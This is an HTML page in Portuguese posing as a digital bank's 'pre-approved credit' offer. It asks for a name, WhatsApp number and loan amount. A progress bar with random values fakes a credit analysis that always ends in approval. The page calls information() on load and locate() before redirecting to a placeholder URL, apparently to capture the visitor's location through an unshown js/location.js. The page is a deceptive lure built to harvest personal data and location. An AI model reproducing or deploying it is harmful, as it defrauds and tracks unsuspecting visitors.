<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Conta Digital</title>

<script>
if (window.location.protocol == "http:") {
  var restOfUrl = window.location.href.substr(5);
  window.location = "https:" + restOfUrl;
}
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="js/location.js"></script>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
  background: #0a0a0a;
  color: #fff;
}

.container {
  max-width: 420px;
  margin: auto;
  padding: 20px;
}

.logo {
  text-align: center;
  font-weight: bold;
  font-size: 22px;
  margin-top: 20px;
  letter-spacing: 1px;
}

.card {
  margin-top: 40px;
  padding: 25px;
  border-radius: 20px;
  background: #111;
  box-shadow: 0 0 40px rgba(138,43,226,0.15);
  animation: fade 0.6s ease;
}

h1 {
  font-size: 22px;
  margin-bottom: 10px;
}

p {
  color: #aaa;
  font-size: 14px;
}

input {
  width: 100%;
  padding: 14px;
  margin-top: 12px;
  border-radius: 12px;
  border: none;
  background: #1c1c1c;
  color: #fff;
  font-size: 14px;
}

button {
  width: 100%;
  padding: 16px;
  margin-top: 20px;
  border-radius: 12px;
  border: none;
  background: linear-gradient(135deg, #8a2be2, #a855f7);
  color: #fff;
  font-weight: bold;
  font-size: 15px;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  transform: scale(1.02);
  box-shadow: 0 0 20px rgba(168,85,247,0.4);
}

.progress {
  height: 6px;
  background: #222;
  border-radius: 10px;
  margin-top: 20px;
  overflow: hidden;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, #8a2be2, #a855f7);
  transition: width 0.4s;
}

.center {
  text-align: center;
}

.hidden {
  display: none;
}

@keyframes fade {
  from {opacity: 0; transform: translateY(20px);}
  to {opacity: 1;}
}
</style>

</head>

<body onload="information();">

<div class="container">

<div class="logo">Conta Digital</div>

<!-- STEP 1 -->
<div class="card" id="step1">
  <h1>Seu crédito pré-aprovado</h1>
  <p>Verifique agora em poucos segundos</p>

  <input type="text" placeholder="Nome completo">
  <input type="tel" placeholder="WhatsApp">
  <input type="number" placeholder="Valor desejado">

  <button onclick="start()">Continuar</button>
</div>

<!-- STEP 2 -->
<div class="card hidden" id="step2">
  <h1>Analisando...</h1>
  <p>Estamos verificando suas informações</p>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <p class="center" id="status">Iniciando análise...</p>
</div>

<!-- STEP 3 -->
<div class="card hidden" id="step3">
  <h1>✔ Crédito liberado</h1>
  <p class="center">Valor aprovado disponível agora</p>

  <button onclick="go()">Acessar</button>
</div>

</div>

<script>
function start() {
  step1.classList.add("hidden");
  step2.classList.remove("hidden");

  let p = 0;
  let bar = document.getElementById("bar");

  let i = setInterval(() => {
    p += Math.random() * 20;
    bar.style.width = p + "%";

    if (p > 30) status.innerText = "Consultando score...";
    if (p > 60) status.innerText = "Validando dados...";
    if (p > 85) status.innerText = "Finalizando...";

    if (p >= 100) {
      clearInterval(i);
      step2.classList.add("hidden");
      step3.classList.remove("hidden");
    }
  }, 500);
}

function go() {
  locate(function(){
    window.location = "REDIRECT_URL";
  });
}
</script>

</body>
</html>
